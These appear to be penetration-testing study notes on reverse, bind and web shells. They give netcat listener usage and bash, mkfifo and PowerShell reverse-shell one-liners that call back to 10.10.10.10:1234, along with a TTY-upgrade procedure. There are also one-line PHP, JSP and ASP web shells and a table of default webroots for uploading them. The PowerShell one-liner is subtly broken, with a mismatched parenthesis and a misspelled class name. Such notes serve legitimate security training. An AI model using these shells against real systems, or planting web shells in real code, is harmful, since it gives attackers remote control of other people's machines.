# TYPES OF SHELLS

## REVERSE SHELL
Connects back to out system and gives us control through a reverse connection

### NETCAT LISTENER
Start a netcat listener on a port of our choosing
> nc -lvnp 1234

Flags   Description
-l      Listen mode. Wait for a connection to connect to us.
-v      Verbose mode. We know when we receive a connection.
-n      Disable DNS resolution and only connect from/to IP. To Speed up the connection.
-p      Port number netcat is listening on, and the reverse connection should be sent to.

### CONNECT BACK IP
We can find our IP with the following command:
>ip a

### REVERSE SHELL COMMAND
The command we execute depends on what OS the compromised host runs.The [Payload All The Things](https://www.github.com/swisskyrepo/PayloadsAllTheThings) page has a list of reverse shell commands we can use that cover a wide range of options depending on our compromised host. Here is a few examples:

> Code: bash
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

> Code: bash
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&3|nc 10.10.10.10 1234 >/tmp/f
```

>Code: powershell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10"),1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEnconding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

A reverse shell is handly when we want to get quick, reliable connection to our compromised host. Take care when reverse shell command is stoped, or we lose connection for any reason. We would have to use the initial exploit to execute reverse shell command again to regain our access.

## BIND SHELL
Waits for us to connect to it and gives us control once we do

### BIND SHELL COMMAND
Once again, we can use [Payloads All The Things](https://www.github.com/swisskyrepo/PayloadsAllTheThings)

### NETCAT CONNECTION
Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it. We can use netcat to connect to that port and get a connection to the shell:
> nc 10.10.10.10 1234

If we drop our connection, we can connect back to it and get another connection immediately. However, if the bind shell command stopped, or if the remote host is rebooted, we should still lose our access and will have to exploit again.

### UPGRADING TTY
If we can not move the text cursor left/right to edit our commands, nor can we go up/down to access the command history, we should to upgrade our TTY. In our netcat shell, we will use the following command:
> python -c 'import pty; pty.spawn("/bin/bash")'

After that, we hit ctrl+z to background our shell and get back on our local terminal, and input the following stty command:
> stty raw -echo
> fg
[Enter]
[Enter]


## WEB SHELL
Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

### WRITING A WEB SHELL
A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web lenguages:

> Code: PHP
```php
<?php system($_REQUEST["cmd"]); ?>
```

> Code: jsp
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

> Code: asp
```asp
<% eval request("cmd") %>
```

### UPLOADING A WEB SHELL
Once we have our web shell we need to place it into the remote host's web directory (webroot). So, the first is identify where the webroot is. The following are the default webroots for common web servers:

Web Server      Default Webroot
Apache          /var/www/html/
Nginx           /usr/local/nginx/html/
ISS             c:\inetpub\wwwroot\
XAMPP           C:\xampp\htdocs\

### ACCESSING WEB SHELL
We can either access it through a browser or by using cURL.
